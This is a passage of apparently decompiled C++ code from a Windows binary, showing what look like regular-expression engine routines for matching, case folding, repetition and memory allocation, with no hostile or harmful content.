      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418420;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418454;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040d8f9(void *this,int *param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_00414534(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040d92f(void *this,int *param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_0041458a(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040d966(void *this,int *param_1,char **param_2)

{
  FUN_00414534(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d97b(void *this,int *param_1,char **param_2)

{
  FUN_0041458a(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d990(void *this,int *param_1)

{
  param_1[4] = *(int *)((int)this + 4);
  FUN_00414534(this,param_1,(char **)(param_1 + 2));
  return;
}



void __thiscall FUN_0040d9ad(void *this,int *param_1)

{
  param_1[4] = *(int *)((int)this + 4);
  FUN_0041458a(this,param_1,(char **)(param_1 + 2));
  return;
}



undefined4 * __thiscall
FUN_0040d9ca(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418488;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004184bc;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040da2c(void *this,int param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  
  uVar2 = FUN_004145db(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040da62(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  
  iVar2 = FUN_00414615(this,param_1,&param_2);
  if (((char)iVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040da99(void *this,int param_1,char **param_2)

{
  FUN_004145db(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040daae(void *this,undefined4 param_1,char **param_2)

{
  FUN_00414615(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040dac3(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_004145db(this,param_1,(char **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040dae0(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414615(this,param_1,(char **)(param_1 + 8));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_0040db46(void *this,char *param_1,char *param_2,void **param_3)

{
  undefined *puVar1;
  undefined *puVar2;
  undefined *puVar3;
  int iVar4;
  char *pcVar5;
  char *pcVar6;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416040;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(undefined4 *)((int)this + 4) = 0;
  *(char **)((int)this + 8) = param_1;
  *(char **)((int)this + 0xc) = param_2;
  *(int *)((int)this + 0x10) = (int)param_2 - (int)param_1;
  *(undefined **)this = &DAT_00418524;
  local_8 = 1;
  puVar2 = (undefined *)FUN_0040507f(*param_3,(int)param_2 - (int)param_1);
  puVar1 = *(undefined **)((int)this + 0xc);
  *(undefined **)((int)this + 0x14) = puVar2;
  puVar3 = *(undefined **)((int)this + 8);
  *(undefined **)this = &DAT_004184f0;
  for (; puVar3 != puVar1; puVar3 = puVar3 + 1) {
    *puVar2 = *puVar3;
    puVar2 = puVar2 + 1;
  }
  if (param_2 != param_1) {
    do {
      iVar4 = toupper((int)*param_1);
      *param_1 = (char)iVar4;
      param_1 = param_1 + 1;
    } while (param_1 != param_2);
  }
  pcVar5 = *(char **)((int)this + 0x14);
  pcVar6 = pcVar5 + *(int *)((int)this + 0x10);
  for (; pcVar6 != pcVar5; pcVar5 = pcVar5 + 1) {
    iVar4 = tolower((int)*pcVar5);
    *pcVar5 = (char)iVar4;
  }
  ExceptionList = local_10;
  return (undefined4 *)this;
}



undefined4 * __thiscall
FUN_0040dbf6(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418558;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_0041858c;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040dc58(void *this,int param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_00414646(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040dc8e(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_00414695(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040dcc5(void *this,int param_1,char **param_2)

{
  FUN_00414646(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040dcda(void *this,undefined4 param_1,char **param_2)

{
  FUN_00414695(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040dcef(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414646(this,param_1,(char **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040dd0c(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414695(this,param_1,(char **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040dd5e(void *this,int *param_1)

{
  FUN_0040a92c(*(void **)((int)this + 8),param_1);
  return;
}



void __thiscall FUN_0040dd73(void *this,int *param_1)

{
  FUN_0040a976(*(void **)((int)this + 8),param_1);
  return;
}



undefined4 * __fastcall FUN_0040ddaf(undefined4 *param_1)

{
  FUN_0040baeb(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0040ddbd(undefined4 *param_1)

{
  thunk_FUN_004077ce(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0040ddcb(undefined4 *param_1)

{
  FUN_0040ddfa(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0040ddd9(undefined4 *param_1)

{
  FUN_0040de2f(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0040dde7(undefined4 *param_1)

{
  FUN_0040de64(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall thunk_FUN_004077ce(undefined4 *param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  uint uStack_8;
  
  puStack_c = &LAB_00415c5f;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_00417758;
  uStack_8 = 1;
  FUN_00407bdb((int)param_1);
  uStack_8 = uStack_8 & 0xffffff00;
  param_1[9] = &DAT_0041782c;
  FUN_00407152(param_1 + 9);
  uStack_8 = 0xffffffff;
  FUN_00408fea(param_1);
  ExceptionList = pvStack_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040ddfa(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416054;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_00406ed3((char *)(param_1 + 0xc));
  local_8 = 0xffffffff;
  FUN_004077ce(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040de2f(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416068;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_0040c5ed((char *)(param_1 + 2));
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040de64(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041607c;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_0040c5ed((char *)(param_1 + 2));
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int __thiscall FUN_0040de99(void *this,undefined *param_1)

{
  int iVar1;
  int *piVar2;
  undefined local_54;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_53 [27];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_38 [16];
  undefined4 local_28;
  undefined4 local_24;
  int local_1c;
  int *local_18 [2];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004160a1;
  local_10 = ExceptionList;
  local_38[0] = param_1._3_1_;
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_38,false);
  local_24 = 0;
  local_28 = 0;
  local_8 = 0;
  local_54 = *param_1;
  param_1._3_1_ = SUB41((uint)local_53 >> 0x18,0);
  local_53[0] = param_1._3_1_;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_53,false);
  local_8._0_1_ = 1;
  FUN_0040baf0(local_53,local_38);
  local_8._0_1_ = 2;
  piVar2 = (int *)FUN_004130db(this,local_18,(int *)&local_54);
  iVar1 = *piVar2;
  local_8 = (uint)local_8._1_3_ << 8;
  local_1c = piVar2[1];
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_53,true);
  local_8 = 0xffffffff;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_38,true);
  ExceptionList = local_10;
  return iVar1 + 0xd;
}



void __thiscall FUN_0040df3e(void *this,undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_00413050(this,&param_2,param_2);
  *param_1 = *puVar1;
  return;
}



void __fastcall FUN_0040df58(int param_1)

{
  ushort *puVar1;
  ushort *puVar2;
  ushort *puVar3;
  undefined uVar4;
  ushort **ppuVar5;
  int iVar6;
  ushort *puVar7;
  uint _C;
  int local_8;
  
  local_8 = param_1;
  if (*(int *)(param_1 + 0x2c) != 0) {
    FUN_004146e4(param_1 + 0x28);
    puVar2 = *(ushort **)(param_1 + 0x2c);
    puVar3 = *(ushort **)(*(ushort **)(param_1 + 0x2c) + 2);
    while (puVar3 != (ushort *)0x0) {
      puVar1 = puVar2 + 1;
      if (puVar2[1] + 1 < (uint)*puVar3) {
        puVar2 = puVar3;
        puVar3 = *(ushort **)(puVar3 + 2);
      }
      else {
        puVar7 = puVar3 + 1;
        if (puVar3[1] < *puVar1) {
          puVar7 = puVar1;
        }
        *puVar1 = *puVar7;
        ppuVar5 = (ushort **)FUN_0041308a((void *)(param_1 + 0x28),&local_8,(int)puVar3,(int)puVar2)
        ;
        puVar3 = *ppuVar5;
      }
    }
  }
  if (*(short *)(param_1 + 0x26) != 0) {
    _C = 0;
    do {
      iVar6 = _isctype(_C,(uint)*(ushort *)(param_1 + 0x26));
      if (iVar6 != 0) {
        FUN_0040828d((void *)(param_1 + 6),(byte)_C);
      }
      _C = _C + 1;
    } while (_C < 0x100);
  }
  if ((*(int *)(param_1 + 0x34) == 0) && (*(int *)(param_1 + 0x3c) == 0)) {
    uVar4 = 1;
  }
  else {
    uVar4 = 0;
  }
  *(undefined *)(param_1 + 5) = uVar4;
  return;
}



void __thiscall FUN_0040e006(void *this,uint param_1)

{
  int iVar1;
  void *pvVar2;
  undefined4 uVar3;
  uint uVar4;
  undefined4 *puVar5;
  void **ppvVar6;
  void *local_8;
  
  uVar4 = param_1;
  *(undefined4 *)(*(int *)((int)this + 0x410) + 8) = *(undefined4 *)((int)this + 0x418);
  iVar1 = *(int *)(*(int *)((int)this + 0x410) + 4);
  if (iVar1 == 0) {
    local_8 = (void *)0xff0;
    ppvVar6 = (void **)&param_1;
    if (param_1 < 0xff1) {
      ppvVar6 = &local_8;
    }
    pvVar2 = *ppvVar6;
    puVar5 = (undefined4 *)operator_new((int)pvVar2 + 0x10);
    uVar3 = *(undefined4 *)((int)this + 0x410);
    puVar5[1] = 0;
    *puVar5 = uVar3;
    iVar1 = (int)puVar5 + uVar4 + 0x10;
    puVar5[2] = iVar1;
    *(int *)((int)this + 0x418) = iVar1;
    iVar1 = (int)puVar5 + (int)pvVar2 + 0x10U;
    puVar5[3] = iVar1;
    *(int *)((int)this + 0x41c) = iVar1;
    *(undefined4 **)(*(int *)((int)this + 0x410) + 4) = puVar5;
    *(undefined4 **)((int)this + 0x410) = puVar5;
    *(undefined4 **)((int)this + 0x414) = puVar5 + 4;
  }
  else {
    if ((*(int *)(iVar1 + 0xc) - iVar1) - 0x10U < param_1) {
      local_8 = this;
      puVar5 = (undefined4 *)operator_new(param_1 + 0x10);
      *puVar5 = *(undefined4 *)((int)this + 0x410);
      puVar5[1] = *(undefined4 *)(*(int *)((int)this + 0x410) + 4);
      iVar1 = (int)puVar5 + uVar4 + 0x10;
      puVar5[3] = iVar1;
      puVar5[2] = iVar1;
      *(int *)((int)this + 0x41c) = iVar1;
      *(int *)((int)this + 0x418) = iVar1;
      **(undefined4 **)(*(int *)((int)this + 0x410) + 4) = puVar5;
      *(undefined4 **)(*(int *)((int)this + 0x410) + 4) = puVar5;
      *(undefined4 **)((int)this + 0x410) = puVar5;
    }
    else {
      *(int *)((int)this + 0x410) = iVar1;
      *(uint *)(iVar1 + 8) = iVar1 + 0x10 + param_1;
      *(undefined4 *)((int)this + 0x418) = *(undefined4 *)(*(int *)((int)this + 0x410) + 8);
      *(undefined4 *)((int)this + 0x41c) = *(undefined4 *)(*(int *)((int)this + 0x410) + 0xc);
      puVar5 = *(undefined4 **)((int)this + 0x410);
    }
    *(undefined4 **)((int)this + 0x414) = puVar5 + 4;
  }
  return;
}



uint __thiscall FUN_0040e130(void *this,int *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)(*(int *)((int)this + 8) * 0x1a + *param_1);
  param_1[2] = param_1[2] + (*piVar1 - piVar1[1]);
  return (uint)piVar1 & 0xffffff00;
}



uint __thiscall FUN_0040e149(void *this,int param_1,int param_2)

{
  int iVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  iVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040c6f8(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = iVar1 - param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040c6f8(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040e1d2:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040e1d2;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e1db(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040c728(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040c728(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040e266:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040e266;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e26f(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040c73d(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040c73d(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e2f0(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  undefined4 uVar4;
  char **ppcVar5;
  uint uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar4 = FUN_004140ea(pvVar2,pcVar3,ppcVar5);
    if ((char)uVar4 != '\0') {
      if (*ppcVar5 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar4 = FUN_004140ea(pvVar2,pcVar3,ppcVar5);
            if ((char)uVar4 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar5 = pcVar1;
    uVar6 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
    if (ppcVar5 != (char **)0x0) {
      *ppcVar5 = pcVar1;
      ppcVar5[1] = param_1;
    }
    uVar4 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar3 + 0x10) = uVar4;
    uVar6 = CONCAT31((int3)((uint)uVar4 >> 8),1);
  }
  return uVar6;
}



uint __thiscall FUN_0040e39b(void *this,int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040c6f8(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040e431;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040c6f8(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040e431;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040c6f8(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040e431:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040e43a(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040c728(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040e4d2;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040c728(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040e4d2;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040c728(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040e4d2:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040e4db(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040c73d(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040e567:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040c73d(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040e567;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040e56b(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  undefined4 uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar4 = (char *)FUN_004140ea(pvVar2,pcVar3,ppcVar5);
  if ((char)pcVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040e618:
      return (uint)pcVar4 & 0xffffff00;
    }
  }
  else if (*ppcVar5 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar5 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar6 = FUN_004140ea(pvVar2,pcVar3,ppcVar5);
        if ((char)uVar6 == '\0') {
          *ppcVar5 = pcVar1;
          pcVar4 = pcVar1;
          goto LAB_0040e618;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
  if (ppcVar5 != (char **)0x0) {
    *ppcVar5 = pcVar1;
    ppcVar5[1] = param_1;
  }
  uVar6 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar3 + 0x10) = uVar6;
  return CONCAT31((int3)((uint)uVar6 >> 8),1);
}



uint __thiscall FUN_0040e61c(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040c73d(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040e67d(void *this,int param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar2 = FUN_004140ea(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      uVar2 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar2;
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
